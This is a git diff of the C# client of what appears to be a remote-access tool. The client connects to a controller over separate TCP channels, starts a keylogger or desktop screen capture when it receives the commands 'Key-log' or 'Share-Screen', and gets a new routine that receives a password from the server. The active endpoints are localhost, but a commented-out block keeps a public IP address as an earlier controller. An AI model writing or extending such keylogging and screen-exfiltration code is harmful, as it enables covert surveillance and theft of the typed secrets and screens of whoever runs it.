@@ -14,6 +14,8 @@ using System.Runtime.InteropServices;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Diagnostics;
 
+
+
 namespace Client
 {
     public partial class Form1 : Form
@@ -33,6 +35,8 @@ namespace Client
         private Thread BeginKeylg ;
         private Thread ClientConnect;
         private Thread ScreenThread;
+
+        string password;
 
         bool isKeyThreadStart = false;
         bool isScreenThreadStart = false;
@@ -57,9 +61,9 @@ namespace Client
                 keylogClient = new TcpClient();
                 shareClient = new TcpClient();
 
-                IPServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9000);
-                IPKeyServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9001);
-                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 9002);
+                IPServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 12000);
+                IPKeyServer = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 12001);
+                IPShare = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 12002);
 
                 /*IPServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 14232);
                 IPKeyServer = new IPEndPoint(IPAddress.Parse("18.136.148.247"), 15202);
@@ -80,7 +84,7 @@ namespace Client
                 shareClient.Connect(IPShare);
                 keylogClient.Connect(IPKeyServer);
 
-                
+                GetPassword();
                 GetCommand();
 
             }
@@ -92,47 +96,71 @@ namespace Client
         }
 
 
+        void GetPassword()
+        {
+            try
+            {
+                mainstream = client.GetStream();
+                byte[] data = new byte[1024];
+                int numBytesRead = mainstream.Read(data, 0, data.Length);
+                string getstr = Encoding.ASCII.GetString(data, 0, numBytesRead);
+                
+                if(numBytesRead> 0)
+                {
+                    if(getstr.StartsWith("pass:"))
+                    {
+                        password = getstr.Substring(5);
+                        //MessageBox.Show(password);
+                    }
+                    
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
+        }
 
         private void GetCommand()
         {
             
             while (client.Connected)
             {
-                            try
-                            {
-                                mainstream = client.GetStream();
-                                byte[] data = new byte[1024];
-                                int numBytesRead=mainstream.Read(data, 0, data.Length);
+                try
+                {
+                    mainstream = client.GetStream();
+                    byte[] data = new byte[1024];
+                    int numBytesRead=mainstream.Read(data, 0, data.Length);
 
-                                string command = Encoding.ASCII.GetString(data, 0, numBytesRead);
+                    string command = Encoding.ASCII.GetString(data, 0, numBytesRead);
 
-                                if (command == "Key-log")
-                                {
-                                    if(!isKeyThreadStart)
+                    if (command == "Key-log")
+                    {
+                        if(!isKeyThreadStart)
+                    {
+                            isKeyThreadStart = true;
+                            BeginThreadLog();
+                        }
+                    }
+
+                    else
+                    {
+                        if (command =="Share-Screen")
                         {
-                                        isKeyThreadStart = true;
-                                        BeginThreadLog();
-                                    }
-                                }
-
-                                else
-                                {
-                                    if (command =="Share-Screen")
-                                    {
-                                        if (!isScreenThreadStart)
-                                        {
-                                             isScreenThreadStart = true;
-                                             BeginThreadShareScreen();
-
-                                        }
-                                    }
-                                }
-                            }
-
-                            catch (IOException ex)
+                            if (!isScreenThreadStart)
                             {
-                                MessageBox.Show(ex.ToString());
+                                    isScreenThreadStart = true;
+                                    BeginThreadShareScreen();
+
                             }
+                        }
+                    }
+                }
+
+                catch (IOException ex)
+                {
+                    MessageBox.Show(ex.ToString());
+                }
             }
             Application.Exit();
         }
@@ -291,10 +319,11 @@ namespace Client
         private Image GrabDesktop()
         {
             Rectangle rect = Screen.PrimaryScreen.Bounds;
+
             rect.Height = (int)(GetDisplayResolution().Height);
             rect.Width = (int)(GetDisplayResolution().Width);
 
-            
+
             Bitmap screenBitmap = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
             Graphics screenGraphics = Graphics.FromImage(screenBitmap);
             screenGraphics.CopyFromScreen(rect.X, rect.Y, 0, 0, rect.Size, CopyPixelOperation.SourceCopy);
